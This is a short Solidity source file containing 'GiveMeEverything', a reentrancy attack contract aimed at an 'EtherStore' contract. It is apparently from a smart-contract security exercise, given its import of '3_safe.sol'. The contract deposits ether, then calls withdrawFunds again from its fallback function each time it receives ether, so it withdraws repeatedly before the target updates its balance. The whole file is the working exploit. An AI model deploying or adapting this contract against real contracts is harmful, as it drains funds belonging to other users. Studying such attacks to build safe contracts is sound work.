pragma solidity ^0.4.19;

import "3_safe.sol";


// Please send a few ethers to me before deploying me!

contract GiveMeEverything {
    EtherStore public store;
    
    constructor() payable {
        
    }
    
    function startAttack(address _addr) public {
        store = EtherStore(_addr);
        
        store.depositFunds.value(2000000000000000000 wei)();
        store.withdrawFunds(500000000000000000 wei);
    }
    
    function() public payable {
        store.withdrawFunds(500000000000000000 wei);
    }
    
}

